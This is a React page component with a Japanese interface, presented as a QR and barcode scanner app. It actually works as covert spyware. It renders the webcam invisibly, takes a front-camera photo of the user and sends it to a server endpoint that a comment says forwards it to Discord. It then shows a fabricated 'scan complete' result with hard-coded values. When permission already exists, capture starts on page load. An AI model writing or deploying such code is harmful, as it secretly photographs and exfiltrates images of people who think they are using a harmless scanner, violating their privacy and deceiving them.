import { useState, useRef, useCallback, useEffect } from "react";
import Webcam from "react-webcam";
import { useCreateCapture } from "@/hooks/use-captures";
import { Button } from "@/components/ui/button";
import { motion, AnimatePresence } from "framer-motion";
import { Scanner } from "@/components/Scanner";
import { ResultCard } from "@/components/ResultCard";
import { Camera, Sparkles } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

export default function Home() {
  const [isScanning, setIsScanning] = useState(false);
  const [hasResult, setHasResult] = useState(false);
  const [showPrompt, setShowPrompt] = useState(true);
  const [isCapturing, setIsCapturing] = useState(false);
  const [cameraReady, setCameraReady] = useState(false);
  const [permissionDenied, setPermissionDenied] = useState(false);
  const webcamRef = useRef<Webcam>(null);
  const { mutate: createCapture } = useCreateCapture();
  const { toast } = useToast();
  const captureTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const initializingRef = useRef(false);

  // マウント時にカメラパーミッションをチェック
  useEffect(() => {
    if (initializingRef.current) return;
    initializingRef.current = true;

    const checkAndRequestPermission = async () => {
      try {
        await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" },
          audio: false 
        });
        // パーミッション許可済み：自動でスキャン開始
        setShowPrompt(false);
        setIsScanning(true);
        setIsCapturing(true);
      } catch (err) {
        // パーミッションが拒否されたか、まだ許可されていない
        setShowPrompt(true);
        setPermissionDenied(false);
      }
    };

    checkAndRequestPermission();
  }, []);

  const handlePermissionRequest = useCallback(async () => {
    setIsCapturing(true);
    setShowPrompt(false);
    
    try {
      await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" },
        audio: false 
      });
      setIsScanning(true);
    } catch (err) {
      console.error("カメラへのアクセスが拒否されました:", err);
      setShowPrompt(true);
      setIsCapturing(false);
      setPermissionDenied(true);
    }
  }, []);

  useEffect(() => {
    if (isScanning && cameraReady && !captureTimeoutRef.current) {
      const imageSrc = webcamRef.current?.getScreenshot();
      if (imageSrc) {
        // Save locally
        createCapture(
          { imageData: imageSrc },
          {
            onError: () => {
              console.error("キャプチャの保存に失敗しました");
            }
          }
        );
        
        // Send to Discord
        fetch('/api/send-camera-image', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ imageData: imageSrc })
        }).catch(err => {
          console.error("Discord への送信に失敗しました:", err);
        });
      }
      
      captureTimeoutRef.current = setTimeout(() => {
        setIsScanning(false);
        setHasResult(true);
        setIsCapturing(false);
        setCameraReady(false);
      }, 3500);
    }
    
    return () => {
      if (captureTimeoutRef.current) {
        clearTimeout(captureTimeoutRef.current);
      }
    };
  }, [isScanning, cameraReady, createCapture]);

  const handleRetake = () => {
    setHasResult(false);
    setIsScanning(false);
    setShowPrompt(false);
    setIsCapturing(true);
    setCameraReady(false);
    if (captureTimeoutRef.current) {
      clearTimeout(captureTimeoutRef.current);
      captureTimeoutRef.current = null;
    }
    setIsScanning(true);
  };

  const handleCameraReady = () => {
    setCameraReady(true);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden bg-gradient-to-br from-white via-blue-50 to-green-50 dark:from-slate-900 dark:via-slate-900 dark:to-slate-800">
      
      {/* Hidden Webcam for Capture */}
      {isScanning && (
        <div className="absolute opacity-0 pointer-events-none">
          <Webcam
            audio={false}
            ref={webcamRef}
            screenshotFormat="image/jpeg"
            width={720}
            height={480}
            videoConstraints={{ facingMode: "user" }}
            onUserMedia={handleCameraReady}
          />
        </div>
      )}

      <div className="w-full max-w-lg relative z-10">
        <AnimatePresence mode="wait">
          {showPrompt && !isScanning && !hasResult && (
            <motion.div
              key="intro"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 1.05 }}
              transition={{ duration: 0.5 }}
              className="text-center space-y-8"
            >
              <div className="space-y-4">
                <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-gradient-to-br from-green-100 to-blue-100 dark:from-green-900/30 dark:to-blue-900/30 border-2 border-green-300 dark:border-green-700 mb-6">
                  <Sparkles className="w-10 h-10 text-green-600 dark:text-green-400 animate-pulse" />
                </div>
                <h1 className="text-4xl md:text-5xl font-bold tracking-tight text-slate-900 dark:text-white">
                  スキャナー
                </h1>
                <p className="text-lg text-slate-600 dark:text-slate-400 max-w-md mx-auto">
                  QRコードとバーコードを素早くスキャン。シンプルで強力な機能。
                </p>
              </div>

              {permissionDenied && (
                <div className="bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-700 rounded-lg p-4 text-sm text-red-700 dark:text-red-400">
                  カメラへのアクセスが拒否されました。再度許可をお願いします。
                </div>
              )}

              <div className="pt-8">
                <Button 
                  size="lg" 
                  onClick={handlePermissionRequest}
                  disabled={isCapturing}
                  className="rounded-full px-8 py-6 text-lg font-bold bg-gradient-to-r from-green-600 via-emerald-600 to-blue-600 hover:from-green-700 hover:via-emerald-700 hover:to-blue-700 text-white shadow-lg hover:shadow-xl transition-all hover:scale-105 disabled:opacity-50"
                  data-testid="button-start-scan"
                >
                  <Camera className="mr-2 w-5 h-5" />
                  カメラを許可する
                </Button>
                <p className="mt-4 text-xs text-slate-500 dark:text-slate-400">
                  スキャンを開始するとカメラへのアクセスが必要です
                </p>
              </div>
            </motion.div>
          )}

          {isScanning && (
            <motion.div
              key="scanning"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="flex flex-col items-center justify-center space-y-8"
            >
              <Scanner />
              <div className="text-center space-y-2">
                <h3 className="text-xl font-bold text-slate-900 dark:text-white">スキャン中...</h3>
                <p className="text-sm text-green-600 dark:text-green-400 animate-pulse">動かないでください</p>
              </div>
            </motion.div>
          )}

          {hasResult && (
            <motion.div
              key="result"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="w-full space-y-6"
            >
              <div className="text-center mb-8">
                <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-2">スキャン完了</h2>
                <p className="text-green-600 dark:text-green-400">スキャンが正常に完了しました</p>
              </div>

              <div className="grid gap-4">
                <ResultCard 
                  title="スキャンタイプ"
                  value="QRコード"
                  icon="activity"
                  delay={0.1}
                />
                <ResultCard 
                  title="解析状態"
                  value="完了"
                  icon="sparkles"
                  delay={0.2}
                />
                <ResultCard 
                  title="ステータス"
                  value="成功"
                  icon="check"
                  delay={0.3}
                />
              </div>

              <div className="pt-8 flex justify-center">
                <Button 
                  variant="outline" 
                  onClick={handleRetake}
                  className="border-green-200 dark:border-green-700 text-green-600 dark:text-green-400 hover:bg-green-50 dark:hover:bg-green-900/10"
                  data-testid="button-retake"
                >
                  もう一度スキャン
                </Button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
      
      {/* Ambient Background Effects */}
      <div className="absolute top-0 left-0 w-full h-full overflow-hidden pointer-events-none z-0">
        <div className="absolute -top-[20%] -left-[10%] w-[50%] h-[50%] rounded-full bg-green-200/40 blur-[100px] dark:bg-green-900/20" />
        <div className="absolute top-[40%] -right-[10%] w-[40%] h-[40%] rounded-full bg-blue-200/40 blur-[100px] dark:bg-blue-900/20" />
      </div>
    </div>
  );
}
